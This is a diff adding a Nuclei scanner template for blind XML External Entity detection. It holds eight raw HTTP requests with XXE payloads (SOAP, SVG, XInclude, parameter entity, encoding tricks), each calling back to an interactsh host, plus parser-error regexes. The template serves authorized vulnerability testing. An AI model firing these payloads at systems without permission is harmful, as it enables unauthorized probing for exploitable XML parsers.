@@ -1,0 +1,228 @@
+id: xxe-oob-blind-detection
+
+info:
+  name: OOB XXE - Blind XML External Entity Detection via Interactsh
+  author: achraf-chehboun
+  severity: critical
+  description: |
+    Detects blind XML External Entity (XXE) injection using out-of-band DNS/HTTP
+    callbacks via Nuclei's interactsh infrastructure. Tests multiple injection
+    vectors including standard XML body, SOAP envelopes, SVG uploads, XLSX/DOCX
+    content-type abuse, and parameter entity exfiltration. Targets Java SAX/DOM
+    parsers, PHP libxml, .NET XmlDocument, and Python lxml. Non-destructive —
+    only triggers DNS resolution, no file exfiltration.
+  reference:
+    - https://portswigger.net/web-security/xxe/blind
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L
+    cvss-score: 7.4
+    cwe-id: CWE-611
+  metadata:
+    max-request: 8
+  tags: xxe,oob,blind,interactsh,xml,soap,detection-only
+
+http:
+  # Test 1: Standard XML body with external entity — DNS OOB
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: */*
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
+        ]>
+        <root>
+          <data>&xxe;</data>
+        </root>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: xxe-standard-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 2: Parameter entity for blind exfiltration detection
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: */*
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY % xxe SYSTEM "http://{{interactsh-url}}/xxe-param-entity">
+          %xxe;
+        ]>
+        <root><data>test</data></root>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: xxe-parameter-entity-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 3: SOAP envelope XXE injection
+  - raw:
+      - |
+        POST /ws HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "urn:test"
+        Accept: */*
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/soap-xxe">
+        ]>
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <test>&xxe;</test>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: soap-xxe-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 4: SVG-based XXE
+  - raw:
+      - |
+        POST /upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: image/svg+xml
+        Accept: */*
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE svg [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/svg-xxe">
+        ]>
+        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+          <text x="10" y="50">&xxe;</text>
+        </svg>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: svg-xxe-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 5: Content-Type override — send XML where JSON is expected
+  - raw:
+      - |
+        POST /api/data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: application/json
+
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/content-type-xxe">
+        ]>
+        <root><query>&xxe;</query></root>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: content-type-swap-xxe
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 6: XInclude injection (when you can't control DTD)
+  - raw:
+      - |
+        POST /api/data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+
+        data=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{{interactsh-url}}/xinclude" parse="text"/></foo>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: xinclude-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 7: UTF-7/UTF-16 encoding bypass
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml; charset=utf-16
+        Accept: */*
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/utf-xxe">
+        ]>
+        <root>&xxe;</root>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: utf-encoded-xxe-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 8: In-band XXE error detection (parser error messages)
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: */*
+
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "file:///dev/null">
+        ]>
+        <root>&xxe;</root>
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: xxe-parser-error
+        regex:
+          - '(?i)DOCTYPE is disallowed'
+          - '(?i)external entity'
+          - '(?i)SAXParseException'
+          - '(?i)XMLParseError'
+          - '(?i)simplexml_load_string'
+          - '(?i)DOMDocument::loadXML'
+          - '(?i)XMLReader'
+          - '(?i)lxml\.etree'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: parser-info
+        group: 0
+        regex:
+          - '(?i)((?:SAX|DOM|XML|libxml|lxml)[\w.]*(?:Error|Exception|Parse)[^<\n]{0,200})'
